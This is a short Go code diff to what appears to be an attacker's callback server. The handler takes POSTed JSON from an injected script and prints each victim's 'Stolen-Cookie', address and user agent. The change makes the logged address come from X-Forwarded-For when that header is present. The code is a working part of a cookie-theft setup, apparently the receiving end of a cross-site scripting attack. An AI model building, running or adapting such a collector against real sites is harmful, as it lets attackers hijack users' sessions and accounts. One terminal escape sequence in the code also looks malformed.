@@ -80,7 +80,12 @@ func callBackFromScript(w http.ResponseWriter, r *http.Request) {
 	if r.Method != "POST" {
 		return
 	}
-	fmt.Printf("  \u001b[30;102m[%s] Callback Received\u001b[0m\n", r.RemoteAddr)
+	if len(r.Header.Get("X-Forwarded-For")) > 0 {
+		fmt.Printf("  \u001b[30;102m[%s] Callback Received\u001b[0m\n", r.Header.Get("X-Forwarded-For"))
+	} else {
+		fmt.Printf("  \u001b[30;102m[%s] Callback Received\u001b[0m\n", r.RemoteAddr)
+	}
+
 	var jsonData callBackStruct
 
 	if jsonErr := json.NewDecoder(r.Body).Decode(&jsonData); jsonErr != nil {
@@ -104,7 +109,6 @@ func callBackFromScript(w http.ResponseWriter, r *http.Request) {
 	if len(r.UserAgent()) > 0 {
 		fmt.Printf("\u001b[User-Agent\u001b[0m: \u001b[96m%s\u001b[0m\n", r.UserAgent())
 	}
-	fmt.Printf("\u001b[93mX-Forwarded-For\u001b[0m: \u001b[96m%s\u001b[0m\n", strings.Join(r.Header.Values("X-Forwarded-For"), ", "))
 	fmt.Printf("\u001b[93mStolen-Cookie\u001b[0m: \u001b[96m%s\u001b[0m\n", jsonData.Cookie)
 
 }
